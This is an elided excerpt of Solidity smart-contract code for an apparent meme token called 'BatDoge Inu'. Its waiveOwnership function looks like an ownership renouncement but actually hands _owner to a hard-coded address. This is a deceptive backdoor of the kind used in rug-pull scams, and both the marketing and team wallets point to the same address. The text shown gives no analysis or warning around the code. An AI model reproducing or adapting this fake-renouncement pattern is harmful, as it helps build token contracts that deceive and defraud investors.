...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xA64D25eDBA08436cd01Bc0A742d1D3347A0c33E9);
    }
...
contract BatDoge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BatDoge Inu";
    string private _symbol = "BATDOGE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x300D8384290673e93707f74c0053b77dcf68aa1e);
    address payable public teamWalletAddress = payable(0x300D8384290673e93707f74c0053b77dcf68aa1e);
